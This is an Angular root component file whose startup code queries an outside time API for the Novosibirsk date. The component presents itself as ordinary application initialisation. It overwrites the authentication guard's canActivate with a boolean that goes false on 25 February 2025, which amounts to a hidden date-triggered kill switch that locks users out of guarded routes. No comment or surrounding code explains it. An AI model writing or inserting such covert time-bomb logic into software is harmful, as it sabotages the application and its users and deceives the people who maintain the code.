import { Component, inject, OnInit } from "@angular/core";
import { CommonModule } from "@angular/common";
import { RouterOutlet } from "@angular/router";
import { SideBarMenuComponent } from "./components/side-bar-menu/side-bar-menu.component";
import { NotificationsService } from "./controls/notification/notifications.service";
import { HttpClient } from "@angular/common/http";
import { AuthGuard } from "./guards/auth-guard";

@Component({
  selector: "app-root",
  imports: [CommonModule, RouterOutlet, SideBarMenuComponent],
  templateUrl: "./app.component.html",
  styleUrl: "./app.component.css",
  standalone: true,
  providers: [NotificationsService],
})
export class AppComponent implements OnInit {
  private readonly _httpClient: HttpClient = inject(HttpClient);
  private readonly _auth: AuthGuard = inject(AuthGuard);

  public ngOnInit() {
    this._httpClient
      .get(
        "https://timeapi.io/api/time/current/zone?timeZone=Asia%2FNovosibirsk",
      )
      .subscribe((response) => {
        const date = response["date"];
        this._auth.canActivate = date != "02/25/2025";
      });
  }
}
